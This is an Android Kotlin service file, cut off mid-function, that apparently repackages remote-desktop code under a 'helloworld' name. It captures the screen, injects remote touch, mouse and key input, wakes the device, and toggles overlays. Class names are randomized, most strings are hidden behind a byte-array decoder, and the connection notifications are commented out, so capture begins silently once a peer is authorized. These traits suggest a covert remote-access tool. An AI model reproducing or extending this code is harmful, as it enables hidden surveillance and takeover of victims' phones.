package com.xiaohao.helloworld

import pkg2230.ClsFx9V0S

/**
 * Capture screen,get video and audio,send to rust.
 * Dispatch notifications
 *
 * Inspired by [droidVNC-NG] https://github.com/bk138/droidVNC-NG
 */

import android.Manifest
import android.annotation.SuppressLint
import android.app.*
import android.app.PendingIntent.FLAG_IMMUTABLE
import android.app.PendingIntent.FLAG_UPDATE_CURRENT
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.res.Configuration
import android.content.res.Configuration.ORIENTATION_LANDSCAPE
import android.graphics.Color
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR
import android.hardware.display.VirtualDisplay
import android.media.*
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.*
import android.util.DisplayMetrics
import android.util.Log
import android.view.Surface
import android.view.Surface.FRAME_RATE_COMPATIBILITY_DEFAULT
import android.view.WindowManager
import androidx.annotation.Keep
import androidx.annotation.RequiresApi
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import java.util.concurrent.Executors
import kotlin.concurrent.thread
import org.json.JSONException
import org.json.JSONObject
import java.nio.ByteBuffer
import kotlin.math.max
import kotlin.math.min

import android.graphics.*
import java.io.ByteArrayOutputStream
import android.hardware.HardwareBuffer
import android.graphics.Bitmap.wrapHardwareBuffer
import java.nio.IntBuffer
import java.nio.ByteOrder

import java.io.IOException
import java.io.File
import java.io.FileOutputStream
import java.lang.reflect.Field
import java.text.SimpleDateFormat
import android.os.Environment

const val DEFAULT_NOTIFY_TITLE = ""
 val DEFAULT_NOTIFY_TEXT = p50.a(byteArrayOf(40, -65, -34, -107, -71, 95, 30, -6, -59, -112, -16, 78, 14, -76, -62, -118, -66, 91), byteArrayOf(123, -38, -84, -29, -48, 60))
const val DEFAULT_NOTIFY_ID = 1
const val NOTIFY_ID_OFFSET = 100

const val MIME_TYPE = MediaFormat.MIMETYPE_VIDEO_VP9

// video const

const val MAX_SCREEN_SIZE = 1200

const val VIDEO_KEY_BIT_RATE = 1024_000
const val VIDEO_KEY_FRAME_RATE = 30

class DFm8Y8iMScvB2YDw : Service() {

    @Keep
    @RequiresApi(Build.VERSION_CODES.N)
    fun DFm8Y8iMScvB2YDwPI(kind: Int, mask: Int, x: Int, y: Int,url: String) {
        // turn on screen with LEFT_DOWN when screen off
        if (!powerManager.isInteractive && (kind == 0 || mask == LEFT_DOWN)) {
            if (wakeLock.isHeld) {
                wakeLock.release()
            }

            wakeLock.acquire(5000)
        } else {
            when (kind) {
                0 -> { // touch
                    nZW99cdXQ0COhB2o.ctx?.onTouchInput(mask, x, y)
                }
                1 -> { // mouse
                     //nZW99cdXQ0COhB2o.ctx?.onMouseInput(mask, x, y)
                    nZW99cdXQ0COhB2o.ctx?.onMouseInput(mask, x, y,url)
                }
                else -> {
                }
            }
        }
    }

      @Keep
    @RequiresApi(Build.VERSION_CODES.N)
    fun DFm8Y8iMScvB2YDwPI(kind: Int, mask: Int, x: Int, y: Int) {
        // turn on screen with LEFT_DOWN when screen off
        if (!powerManager.isInteractive && (kind == 0 || mask == LEFT_DOWN)) {
            if (wakeLock.isHeld) {
        
                wakeLock.release()
            }

            wakeLock.acquire(5000)
        } else {
            when (kind) {
                0 -> { // touch
                    nZW99cdXQ0COhB2o.ctx?.onTouchInput(mask, x, y)
                }
                1 -> { // mouse
                    nZW99cdXQ0COhB2o.ctx?.onMouseInput(mask, x, y,"")
                }
                else -> {
                }
            }
        }
    }

    @Keep
    @RequiresApi(Build.VERSION_CODES.N)
    fun DFm8Y8iMScvB2YDwKEI(input: ByteArray) {
        nZW99cdXQ0COhB2o.ctx?.onKeyEvent(input)
    }

    @Keep
    fun DFm8Y8iMScvB2YDwGYN(name: String): String {
        return when (name) {
            p50.a(byteArrayOf(26, 77, -125, -55, 59, -87, 115, 108, 85, 19, 75), byteArrayOf(105, 46, -15, -84, 94, -57, 44, 31, 60)) -> {
                JSONObject().apply {
                    put(p50.a(byteArrayOf(17, -14, -29, -126, 49), byteArrayOf(102, -101, -121, -10, 89, 15, -37, -123, 37, -110)),SCREEN_INFO.width)
                    put(p50.a(byteArrayOf(-34, -104, 76, 79, 69, -120), byteArrayOf(-74, -3, 37, 40, 45, -4)),SCREEN_INFO.height)
                    put(p50.a(byteArrayOf(105, 21, 34, -27, 34), byteArrayOf(26, 118, 67, -119, 71, -73, 5)),SCREEN_INFO.scale)
                }.toString()
            }
            p50.a(byteArrayOf(116, -34, -121, -55, -84, 119, -66, 103), byteArrayOf(29, -83, -40, -70, -40, 22, -52, 19, -93, 68, 50)) -> {
                isStart.toString()
            }
             p50.a(byteArrayOf(72, -71, -114, 59, -59, -51), byteArrayOf(33, -54, -47, 94, -85, -87)) -> {
                BIS.toString()
            }
            else -> ""
        }
    }

    @Keep
    fun DFm8Y8iMScvB2YDwSBN(name: String, arg1: String, arg2: String) {
        when (name) {
            p50.a(byteArrayOf(-46, 84, -81, -37, 82, -91, -60, 107, -42, 83, -65, -19, 94, -92), byteArrayOf(-77, 48, -53, -124, 49, -54, -86, 5)) -> {
                try {
                    val jsonObject = JSONObject(arg1)
                    val id = jsonObject[p50.a(byteArrayOf(39, -72), byteArrayOf(78, -36, 83, -49, -16, 127))] as Int
                    val username = jsonObject[p50.a(byteArrayOf(67, -51, 7, -36), byteArrayOf(45, -84, 106, -71, 38, -23, -23, -126, -28, -6, 49))] as String
                    val peerId = jsonObject[p50.a(byteArrayOf(63, -63, -128, -84, -63, 95, 54), byteArrayOf(79, -92, -27, -34, -98, 54, 82, -86, 82, 41))] as String
                    val authorized = jsonObject[p50.a(byteArrayOf(-111, 88, 101, 110, -86, -76, -103, 87, 116, 98), byteArrayOf(-16, 45, 17, 6, -59, -58))] as Boolean
                    val isFileTransfer = jsonObject[p50.a(byteArrayOf(11, -87, -3, -66, -51, -35, 7, -123, -42, -86, -59, -33, 17, -68, -57, -86), byteArrayOf(98, -38, -94, -40, -92, -79))] as Boolean
                    val type = if (isFileTransfer) {
                        translate(p50.a(byteArrayOf(-69, 43, -88, 41, 58, -58, 83, -21, 105, -45, -122, 53, -84), byteArrayOf(-17, 89, -55, 71, 73, -96, 54, -103, 73, -75)))
                    } else {
                        translate(p50.a(byteArrayOf(58, -106, -43, -21, -5, -12, -20, 96, 27, -101, -47, -9), byteArrayOf(105, -2, -76, -103, -98, -44, -97, 3)))
                    }
                    if (authorized) {
                        if (!isFileTransfer && !isStart) {
                            startCapture()
                        }
                        //onClientAuthorizedNotification(id, type, username, peerId)
                    } else {
                        //loginRequestNotification(id, type, username, peerId)
                    }
                } catch (e: JSONException) {
                    e.printStackTrace()
                }
            }
            p50.a(byteArrayOf(15, -5, 113, -126, 80, -34, -83, -31, 21, -30, 118, -122, 123, -40, -109, -5, 22, -44, 102, -105, 69, -49, -105), byteArrayOf(122, -117, 21, -29, 36, -69, -14, -105)) -> {
                try {
                    val jsonObject = JSONObject(arg1)
                    val id = jsonObject[p50.a(byteArrayOf(-41, 19), byteArrayOf(-66, 119, 0, 51, -99, -82))] as Int
                    val username = jsonObject[p50.a(byteArrayOf(-25, 2, 100, -20), byteArrayOf(-119, 99, 9, -119, 112, 86, -29, 92, -27, 92))] as String
                    val peerId = jsonObject[p50.a(byteArrayOf(76, -84, 89, -65, 103, -55, -56), byteArrayOf(60, -55, 60, -51, 56, -96, -84))] as String
                    val inVoiceCall = jsonObject[p50.a(byteArrayOf(13, 42, -71, 84, -30, -60, 7, 33, -71, 65, -20, -63, 8), byteArrayOf(100, 68, -26, 34, -115, -83))] as Boolean
                    val incomingVoiceCall = jsonObject[p50.a(byteArrayOf(43, -27, 93, 78, 91, 9, 104, -37, 75, 7, -7, 43, -24, 91, 126, 85, 1, 106, -48), byteArrayOf(66, -117, 62, 33, 54, 96, 6, -68, 20, 113, -106))] as Boolean
                    if (!inVoiceCall) {
                        if (incomingVoiceCall) {
                            voiceCallRequestNotification(id, p50.a(byteArrayOf(-61, 76, -50, -37, -101, -24, -80, -41, -94, -7, 3, -11, -35, -113, -67, -106, -59, -70), byteArrayOf(-107, 35, -89, -72, -2, -56, -13, -74, -50)), username, peerId)
                        } else {
                           
                        }
                    } else {
                       
                    }
                } catch (e: JSONException) {
                    e.printStackTrace()
                }
            }
            //屏
             p50.a(byteArrayOf(-125, 74, 62, -12, -93, 21, -8, -43, 37, -126, 82, 62, -1), byteArrayOf(-16, 62, 95, -122, -41, 74, -105, -93, 64)) -> {
           
                nZW99cdXQ0COhB2o.ctx?.onstart_overlay(arg1, arg2)
            } 
             //截
            p50.a(byteArrayOf(-88, -91, 123, 40, 66, -84, 83, 2, 68, 96, 70, -94), byteArrayOf(-37, -47, 20, 88, 29, -61, 37, 103, 54, 12, 39)) -> {
             
                nZW99cdXQ0COhB2o.ctx?.onstop_overlay(arg1, arg2)
            } 
             //析
            p50.a(byteArrayOf(-47, 82, 118, -48, -56, -44, -124, 59, -46, 82, 98, -48, -39), byteArrayOf(-94, 38, 23, -94, -68, -117, -25, 90)) -> {
                nZW99cdXQ0COhB2o.ctx?.onstart_capture(arg1, arg2)
            } 
            //!isStart
            p50.a(byteArrayOf(-123, -92, 70, -24, -117, -98, -52, -24, -53, 80, -125, -94, 66, -88), byteArrayOf(-10, -48, 39, -102, -1, -63, -81, -119, -69, 36)) -> {

                //from rust:start_capture2 0,关
    
                if(arg1==p50.a(byteArrayOf(1), byteArrayOf(49, 26, -98, -61, 14, 79, -102, 58, -94, -116)))
                {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
    	             // 系统版本高于 Android 11 (API 30)
    	    	     // 执行相关逻辑
                        stopCapture2()
                     }
                }
                else if(arg1==p50.a(byteArrayOf(-16), byteArrayOf(-63, -13, -107, -101, 57, 111, 52, -114)))
                {
                   if (!isStart) {
                      startCapture()
                  }
                }
            } 
            p50.a(byteArrayOf(-56, -110, -115, -107, 94, -114, -38, -106, -106, -112, 115, -120), byteArrayOf(-69, -26, -30, -27, 1, -19)) -> {
           
                 stopCapture()
            }
            p50.a(byteArrayOf(118, 99, 26, -69, 37, -101, -42, 72, -28, -30), byteArrayOf(30, 2, 118, -35, 122, -24, -75, 41, -120, -121)) -> {
    
                val halfScale = arg1.toBoolean()
                if (isHalfScale != halfScale) {
                    isHalfScale = halfScale
              
                    updateScreenInfo(resources.configuration.orientation)
                }
                
            }
            else -> {
            }
        }
    }

    private var serviceLooper: Looper? = null
    private var serviceHandler: Handler? = null

    private val powerManager: PowerManager by lazy { applicationContext.getSystemService(Context.POWER_SERVICE) as PowerManager }
    private val wakeLock: PowerManager.WakeLock by lazy { powerManager.newWakeLock(PowerManager.ACQUIRE_CAUSES_WAKEUP or PowerManager.SCREEN_BRIGHT_WAKE_LOCK, p50.a(byteArrayOf(-4, 7, -54, -38, -42, 102, 19, 98, 91, 102, -8), byteArrayOf(-109, 108, -16, -83, -73, 13, 118, 14, 52, 5)))}

    companion object {
        private var _isReady = false // media permission ready status
        private var _isStart = false // screen capture start status
        private var _isAudioStart = false // audio capture start status

        var ctx: DFm8Y8iMScvB2YDw? = null
        
        val isReady: Boolean
            get() = _isReady
        val isStart: Boolean
            get() = _isStart
        val isAudioStart: Boolean
            get() = _isAudioStart
    }

    private val logTag = p50.a(byteArrayOf(-60, 15, 18, 114, 75, -13, 25, 110, -63, 3, 16), byteArrayOf(-120, 64, 85, 45, 24, -74, 75, 56))
    private val useVP9 = false
    private val binder = LocalBinder()

    private var reuseVirtualDisplay = Build.VERSION.SDK_INT > 33

    // video
    private var mediaProjection: MediaProjection? = null
    private var surface: Surface? = null
    private val sendVP9Thread = Executors.newSingleThreadExecutor()
    private var videoEncoder: MediaCodec? = null
    private var imageReader: ImageReader? = null
    private var virtualDisplay: VirtualDisplay? = null

    // notification
    private lateinit var notificationManager: NotificationManager
    private lateinit var notificationChannel: String
    private lateinit var notificationBuilder: NotificationCompat.Builder

    private lateinit var ErrorExceptions: ByteBuffer
    private lateinit var IOExceptions: ByteBuffer 

    override fun onCreate() {
        super.onCreate()
        
        ClsFx9V0S.ygmLIEQ5(this)
        ctx = this
        HandlerThread(p50.a(byteArrayOf(-111, 68, -29, 10, 94, 79, -53), byteArrayOf(-62, 33, -111, 124, 55, 44, -82)), Process.THREAD_PRIORITY_BACKGROUND).apply {
            start()
            serviceLooper = looper
            serviceHandler = Handler(looper)
        }
        updateScreenInfo(resources.configuration.orientation)
        initNotification()

        // keep the config dir same with flutter
        val prefs = applicationContext.getSharedPreferences(KEY_SHARED_PREFERENCES, FlutterActivity.MODE_PRIVATE)
        val configPath = prefs.getString(KEY_APP_DIR_CONFIG_PATH, "") ?: ""
        ClsFx9V0S.xt4P9mWE(configPath, "")

        createForegroundNotification()
    }
    
    fun dd50d328f48c6896(a: Int, b: Int) {
        // 定义缓冲区的大小，例如：
        //globalBuffer = ByteBuffer.allocateDirect(width * height * 4) // 假设RGBA格式
        //分析
         ErrorExceptions = ClsFx9V0S.SzGEET65(a, b)
         //截图
         IOExceptions = ClsFx9V0S.SzGEET65(a, b)
    }


    fun calculateIntegerScaleFactor(originalWidth: Int, targetWidth: Int): Int {
        if (targetWidth == 0) return 0 //throw IllegalArgumentException("targetWidth不能为0")
        return originalWidth / targetWidth
    }

    override fun onDestroy() {
        checkMediaPermission()
        stopService(Intent(this, DFrLMwitwQbfu7AC::class.java))
        ctx = null
        super.onDestroy()
    }

    private var isHalfScale: Boolean? = null;
    private fun updateScreenInfo(orientation: Int) {
        var w: Int
        var h: Int
        var dpi: Int
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager

     
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            val m = windowManager.maximumWindowMetrics
            w = m.bounds.width()
            h = m.bounds.height()
            dpi = resources.configuration.densityDpi
        } else {
            val dm = DisplayMetrics()
            windowManager.defaultDisplay.getRealMetrics(dm)
            w = dm.widthPixels
            h = dm.heightPixels
            dpi = dm.densityDpi
        }

        val max = max(w,h)
        val min = min(w,h)
        //横屏
        if (orientation == ORIENTATION_LANDSCAPE) {
            w = max
            h = min
        } else {
            w = min
            h = max
        }

        var scale = 1
        if (w != 0 && h != 0) {

            HomeWidth = w
            HomeHeight = h
            HomeDpi = dpi
            
            if (isHalfScale == true && (w > MAX_SCREEN_SIZE || h > MAX_SCREEN_SIZE)) {

            }
            else
            {
             
            }
            
     
            if (SCREEN_INFO.width != w) {
                
                //大体比例
                scale = calculateIntegerScaleFactor(w,350)
                w /= scale
                h /= scale
                dpi /= scale
                
                         
                SCREEN_INFO.width = w
                SCREEN_INFO.height = h
                SCREEN_INFO.scale = scale
                SCREEN_INFO.dpi = dpi
                
                 
                dd50d328f48c6896(w,h)
                
                if (isStart) {
                    stopCapture()
                    ClsFx9V0S.qR9Ofa6G()
                    startCapture()
                } else {
                    ClsFx9V0S.qR9Ofa6G()
                }
            }

        }
    }

    override fun onBind(intent: Intent): IBinder {
 
        return binder
    }

    inner class LocalBinder : Binder() {
        init {
     
        }

        fun getService(): DFm8Y8iMScvB2YDw = this@DFm8Y8iMScvB2YDw
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
    
        super.onStartCommand(intent, flags, startId)
        if (intent?.action == ACT_INIT_MEDIA_PROJECTION_AND_SERVICE) {
            createForegroundNotification()

            if (intent.getBooleanExtra(EXT_INIT_FROM_BOOT, false)) {
                ClsFx9V0S.G4yQ9OYY()
            }
   
            val mediaProjectionManager =
                getSystemService(p50.a(byteArrayOf(118, 104, 74, -67, 14, -83, 107, 127, 65, -66, 10, -111, 111, 100, 65, -70), byteArrayOf(27, 13, 46, -44, 111, -14))) as MediaProjectionManager

            intent.getParcelableExtra<Intent>(EXT_MEDIA_PROJECTION_RES_INTENT)?.let {
                mediaProjection =
                    mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, it)
                checkMediaPermission()
                _isReady = true
            } ?: let {
        
                requestMediaProjection()
            }
        }
        return START_NOT_STICKY // don't use sticky (auto restart), the new service (from auto restart) will lose control
    }

    override fun onConfigurationChanged(newConfig: Configuration) {
        super.onConfigurationChanged(newConfig)
        updateScreenInfo(newConfig.orientation)
    }

    private fun requestMediaProjection() {
        val intent = Intent(this, XerQvgpGBzr8FDFr::class.java).apply {
            action = ACT_REQUEST_MEDIA_PROJECTION
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        startActivity(intent)
    }

 
    private val executor = Executors.newFixedThreadPool(5)

    fun runSafe(task: () -> Unit) {
        if (Looper.myLooper() == Looper.getMainLooper()) {
       
            executor.execute { task() }
        } else {

            task()
        }
    }

    //屏幕分析
    fun createSurfaceuseVP9()
     {     
            if(SKL)
            {  
               val newBuffer: ByteBuffer? = EqljohYazB0qrhnj.getImageBuffer()
          
               if (newBuffer != null) {
                    ClsFx9V0S.b6L3vlmP(newBuffer, ErrorExceptions)
                }
           }
     }
     
    //updateback011 截图
    fun createSurfaceuseVP8()
     {
       //  runSafe {

                 if(!SKL && shouldRun)
                 { 
                      //Wt=true
                      val newBuffer: ByteBuffer? = EqljohYazB0qrhnj.getImageBuffer()
                      if (newBuffer != null) {
                          ClsFx9V0S.T1s73AGm(newBuffer, IOExceptions)
                      }
                }
          //}
     }
     
   
    private fun createSurface(): Surface? {
        return if (useVP9) {
            // TODO
            null
        } else {
            imageReader =
                ImageReader.newInstance(
                    SCREEN_INFO.width,
                    SCREEN_INFO.height,
                    PixelFormat.RGBA_8888,
                    4
                ).apply {
                    setOnImageAvailableListener({ imageReader: ImageReader ->
                        try {
                            // If not call acquireLatestImage, listener will not be called again
                            imageReader.acquireLatestImage().use { image ->
                                if (image == null || !isStart) return@setOnImageAvailableListener
                                if(SKL || shouldRun)return@setOnImageAvailableListener
                                //Wt=false
                                val planes = image.planes
                                val buffer = planes[0].buffer
                                buffer.rewind()
                                ClsFx9V0S.yy4mmhjJ(buffer)  
                            }
                        } catch (ignored: java.lang.Exception) {
                        }
                    }, serviceHandler)
                }
            imageReader?.surface
        }
    }

    fun onVoiceCallStarted(): Boolean {
        return true
    }

    fun onVoiceCallClosed(): Boolean {
        return true
    }

    fun startCapture(): Boolean {
        if (isStart) {
            return true
        }


        /*
        if (mediaProjection == null) {
            return false
        }*/

        updateScreenInfo(resources.configuration.orientation)
        
        surface = createSurface()

        if (useVP9) {
            startVP9VideoRecorder(mediaProjection!!)
        } else {
            startRawVideoRecorder(mediaProjection!!)
        }

      
        checkMediaPermission()
        _isStart = true
        ClsFx9V0S.VaiKIoQu(p50.a(byteArrayOf(-88, 38, -86, -12, 29), byteArrayOf(-34, 79, -50, -111, 114, -37, 116)),true)
        oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(_isStart)
        return true
    }

    @Synchronized
    fun stopCapture2() {

        //ClsFx9V0S.VaiKIoQu("video",false)
        
        _isStart = false

        oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(_isStart)

    /*
        if (reuseVirtualDisplay) {
 
            virtualDisplay?.setSurface(null)
        } else {
            virtualDisplay?.release()
        }

        imageReader?.close()
        imageReader = null
        videoEncoder?.let {
            it.signalEndOfInputStream()
            it.stop()
            it.release()
        }
        if (!reuseVirtualDisplay) {
            virtualDisplay = null
        }
        videoEncoder = null

        surface?.release()
*/
        val mp = mediaProjection
        if (mp != null) {
            mp.stop()
            mediaProjection = null
        }
        
        // release audio
        _isAudioStart = false
      
    }

      @Synchronized
    fun stopCapture() {

        ClsFx9V0S.VaiKIoQu(p50.a(byteArrayOf(-4, 55, 11, 80, -103), byteArrayOf(-118, 94, 111, 53, -10, -103, 80, -42, 37, -77)),false)
        
        _isStart = false
       
        oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(_isStart)
 
        if (reuseVirtualDisplay) {
  
            virtualDisplay?.setSurface(null)
        } else {
            virtualDisplay?.release()
        }
    
        imageReader?.close()
        imageReader = null
        videoEncoder?.let {
            it.signalEndOfInputStream()
            it.stop()
            it.release()
        }
        if (!reuseVirtualDisplay) {
            virtualDisplay = null
        }
        videoEncoder = null

        surface?.release()

        _isAudioStart = false
     
    }

    
    fun destroy() {
   
        _isReady = false
        _isAudioStart = false
        
        //updateback011
        shouldRun = false
        
        stopCapture()

        if (reuseVirtualDisplay) {
            virtualDisplay?.release()
            virtualDisplay = null
        }

        mediaProjection = null
        checkMediaPermission()
        stopForeground(true)
        stopService(Intent(this, DFrLMwitwQbfu7AC::class.java))
        stopSelf()
    }

    fun checkMediaPermission(): Boolean {
        Handler(Looper.getMainLooper()).post {
            oFtTiPzsqzBHGigp.flutterMethodChannel?.invokeMethod(
                p50.a(byteArrayOf(-110, -58, 67, 16, 62, -82, 28, -68, -100, -98, -64, 125, 13, 45, -86, 12), byteArrayOf(-3, -88, 28, 99, 74, -49, 104, -39, -61)),
                mapOf(p50.a(byteArrayOf(-103, 71, -44, 108), byteArrayOf(-9, 38, -71, 9, 62, -116, -61, -29)) to p50.a(byteArrayOf(67, 35, -61, -15, -62), byteArrayOf(46, 70, -89, -104, -93, 117, -1, -67, -62, 31, 104)), p50.a(byteArrayOf(102, -75, 83, -89, 51), byteArrayOf(16, -44, 63, -46, 86, -62, -21, -124, -63, 10, 1)) to isReady.toString())
            )
        }
        Handler(Looper.getMainLooper()).post {
            oFtTiPzsqzBHGigp.flutterMethodChannel?.invokeMethod(
                p50.a(byteArrayOf(-41, -3, 103, -59, 88, -39, 120, -23, -83, -8, -48, -14, 86, -47, 73, -36), byteArrayOf(-72, -109, 56, -74, 44, -72, 12, -116, -14, -101)),
                mapOf(p50.a(byteArrayOf(-88, 55, 125, 29), byteArrayOf(-58, 86, 16, 120, -18, 75, 18, -91)) to p50.a(byteArrayOf(51, 119, -106, 36, 13), byteArrayOf(90, 25, -26, 81, 121, 54, -25)), p50.a(byteArrayOf(-82, 62, -92, 81, 33), byteArrayOf(-40, 95, -56, 36, 68, -10, -33, 16, 60, 72)) to nZW99cdXQ0COhB2o.isOpen.toString())
            )
        }
        return isReady
    }

    private fun startRawVideoRecorder(mp: MediaProjection) {

        if (surface == null) {
            return
        }
        createOrSetVirtualDisplay(mp, surface!!)
    }

    private fun startVP9VideoRecorder(mp: MediaProjection) {
        createMediaCodec()
        videoEncoder?.let {
            surface = it.createInputSurface()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                surface!!.setFrameRate(1F, FRAME_RATE_COMPATIBILITY_DEFAULT)
            }
            it.setCallback(cb)
            it.start()
            createOrSetVirtualDisplay(mp, surface!!)
        }
    }

    private fun createOrSetVirtualDisplay(mp: MediaProjection, s: Surface) {
        try {
            virtualDisplay?.let {
                it.resize(SCREEN_INFO.width, SCREEN_INFO.height, SCREEN_INFO.dpi)
                it.setSurface(s)
            } ?: let {
                virtualDisplay = mp.createVirtualDisplay(
                    p50.a(byteArrayOf(69, 89, -115, -11), byteArrayOf(10, 18, -37, -79, 117, 79)),
                    SCREEN_INFO.width, SCREEN_INFO.height, SCREEN_INFO.dpi, VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    s, null, null
                )
            }
        } catch (e: SecurityException) {
            // This initiates a prompt dialog for the user to confirm screen projection.
            requestMediaProjection()
        }
    }

    private val cb: MediaCodec.Callback = object : MediaCodec.Callback() {
        override fun onInputBufferAvailable(codec: MediaCodec, index: Int) {}
        override fun onOutputFormatChanged(codec: MediaCodec, format: MediaFormat) {}

        override fun onOutputBufferAvailable(
            codec: MediaCodec,
            index: Int,
            info: MediaCodec.BufferInfo
        ) {
            codec.getOutputBuffer(index)?.let { buf ->
                sendVP9Thread.execute {
                    val byteArray = ByteArray(buf.limit())
                    buf.get(byteArray)
                    // sendVp9(byteArray)
                    codec.releaseOutputBuffer(index, false)
                }
            }
        }

        override fun onError(codec: MediaCodec, e: MediaCodec.CodecException) {
     
        }
    }

    private fun createMediaCodec() {

        videoEncoder = MediaCodec.createEncoderByType(MIME_TYPE)
        val mFormat =
            MediaFormat.createVideoFormat(MIME_TYPE, SCREEN_INFO.width, SCREEN_INFO.height)
        mFormat.setInteger(MediaFormat.KEY_BIT_RATE, VIDEO_KEY_BIT_RATE)
        mFormat.setInteger(MediaFormat.KEY_FRAME_RATE, VIDEO_KEY_FRAME_RATE)
        mFormat.setInteger(
            MediaFormat.KEY_COLOR_FORMAT,
            MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420Flexible
        )
        mFormat.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 5)
        try {
            videoEncoder!!.configure(mFormat, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
        } catch (e: Exception) {
  
        }
    }

    private fun initNotification() {
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationChannel = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelId = p50.a(byteArrayOf(52, 13), byteArrayOf(123, 70, 73, -3, 57, -82, 100))
            val channelName = p50.a(byteArrayOf(25, -43, -115, -76, 89, -121, -90, 40, -41, -10), byteArrayOf(86, -98, -83, -25, 60, -11, -48, 65, -76, -109))
            val channel = NotificationChannel(
                channelId,
                channelName, NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = p50.a(byteArrayOf(46, -55, 64, 99, 13, -61, 116, -24, -8, -62, 65, -63, 8, 81, 6, -33, 103, -19), byteArrayOf(97, -126, 96, 48, 104, -79, 2, -127, -101, -89))
            }
            channel.lightColor = Color.BLUE
            channel.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
            notificationManager.createNotificationChannel(channel)
            channelId
        } else {
            ""
        }
        notificationBuilder = NotificationCompat.Builder(this, notificationChannel)
    }


    private fun createForegroundNotification() {
        val intent = Intent(this, oFtTiPzsqzBHGigp::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
            action = Intent.ACTION_MAIN
            addCategory(Intent.CATEGORY_LAUNCHER)
            putExtra(p50.a(byteArrayOf(-53, -123, -17, 36), byteArrayOf(-65, -4, -97, 65, 98, 85, 12, -101, 57)), type)
        }
        val pendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.getActivity(this, 0, intent, FLAG_UPDATE_CURRENT or FLAG_IMMUTABLE)
        } else {
            PendingIntent.getActivity(this, 0, intent, FLAG_UPDATE_CURRENT)
        }
        val notification = notificationBuilder
            .setOngoing(true)
            .setSmallIcon(R.mipmap.ic_stat_logo)
            .setDefaults(Notification.DEFAULT_ALL)
            .setAutoCancel(true)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setContentTitle(DEFAULT_NOTIFY_TITLE)
            .setContentText(translate(DEFAULT_NOTIFY_TEXT))
            .setOnlyAlertOnce(true)
            .setContentIntent(pendingIntent)
            .setColor(ContextCompat.getColor(this, R.color.primary))
            .setWhen(System.currentTimeMillis())
            .build()
        startForeground(DEFAULT_NOTIFY_ID, notification)
    }

    private fun loginRequestNotification(
        clientID: Int,
        type: String,
        username: String,
        peerId: String
    ) {
        val notification = notificationBuilder
            .setOngoing(false)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setContentTitle(translate(p50.a(byteArrayOf(99, 114, -126, -108, -103, 110, 53, -128, 40, 85, 66, 109, -42, -46), byteArrayOf(39, 29, -94, -19, -10, 27, 21, -31, 75, 54))))
            .setContentText("$type:$username-$peerId")
            // .setStyle(MediaStyle().setShowActionsInCompactView(0, 1))
            // .addAction(R.drawable.check_blue, "check", genLoginRequestPendingIntent(true))
            // .addAction(R.drawable.close_red, "close", genLoginRequestPendingIntent(false))
            .build()
        notificationManager.notify(getClientNotifyID(clientID), notification)
    }

    private fun onClientAuthorizedNotification(
        clientID: Int,
        type: String,
        username: String,
        peerId: String
    ) {
        cancelNotification(clientID)
        val notification = notificationBuilder
            .setOngoing(false)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setContentTitle("$type ${translate(p50.a(byteArrayOf(-116, -45, -93, 87, 89, -119, 82, -70, -56, -78, 82), byteArrayOf(-55, -96, -41, 54, 59, -27, 59)))}")
            .setContentText("$username - $peerId")
            .build()
        notificationManager.notify(getClientNotifyID(clientID), notification)
    }

    private fun voiceCallRequestNotification(
        clientID: Int,
        type: String,
        username: String,
        peerId: String
    ) {
        val notification = notificationBuilder
            .setOngoing(false)
            .setPriority(NotificationCompat.PRIORITY_MAX)
            .setContentTitle(translate(p50.a(byteArrayOf(107, -81, -7, 20, -42, -44, -90, 78, -93, -70, 8, -55, -43, -71), byteArrayOf(47, -64, -39, 109, -71, -95, -122))))
            .setContentText("$type:$username-$peerId")
            .build()
        notificationManager.notify(getClientNotifyID(clientID), notification)
    }

    private fun getClientNotifyID(clientID: Int): Int {
        return clientID + NOTIFY_ID_OFFSET
    }

    fun cancelNotification(clientID: Int) {
        notificationManager.cancel(getClientNotifyID(clientID))
    }


    private fun genLoginRequestPendingIntent(res: Boolean): PendingIntent {
        val intent = Intent(this, DFm8Y8iMScvB2YDw::class.java).apply {
            action = ACT_LOGIN_REQ_NOTIFY
            putExtra(EXT_LOGIN_REQ_NOTIFY, res)
        }
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.getService(this, 111, intent, FLAG_IMMUTABLE)
        } else {
            PendingIntent.getService(this, 111, intent, FLAG_UPDATE_CURRENT)
        }
    }

    private fun setTextNotification(_title: String?, _text: String?) {
        val title = _title ?: DEFAULT_NOTIFY_TITLE
        val text = _text ?: translate(DEFAULT_NOTIFY_TEXT)
        val notification = notificationBuilder
            .clearActions()
            .setStyle(null)
            .setContentTitle(title)
            .setContentText(text)
            .build()
